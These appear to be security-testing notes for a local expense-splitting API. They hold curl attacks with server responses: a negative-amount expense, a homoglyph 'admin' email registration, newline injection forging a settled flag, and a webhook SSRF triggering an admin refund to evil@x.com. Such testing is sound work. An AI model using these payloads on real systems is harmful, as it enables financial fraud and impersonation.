# Attack 1
curl -G -X POST "localhost:8000/api/groups/1/expenses" \
  --data-urlencode "amount=-500" --data-urlencode "payer=alice" \
  --data-urlencode "payer_email=alice@x.com"

{"expense_added":true,"share_owed_per_member":0}

# Attack 2
curl -G -X POST "localhost:8000/api/register" \
--data-urlencode "email=аdmin@x.com" --data-urlencode "password=secret123"

{"detail":"user аdmin@x.com already exists"}

---

curl -G -X POST "localhost:8000/api/groups/1/expenses" \
  --data-urlencode "amount=50" \
  --data-urlencode $'payer=alice\nSETTLED: true' \
  --data-urlencode "payer_email=a@x.com"

{"expense_added":true,"share_owed_per_member":0}

# Attach 3
curl -G -X POST "localhost:8000/api/groups/1/settle" \
  --data-urlencode "from_user=alice@x.com" --data-urlencode "to_user=bob@x.com" \
  --data-urlencode "amount=10" \
  --data-urlencode "webhook_url=http://localhost:8000/admin/refund?user_email=evil@x.com&amount=9999"

INFO:     127.0.0.1:52218 - "POST /admin/refund?user_email=evil@x.com&amount=9999 HTTP/1.1" 200 OK  

{"settled":true}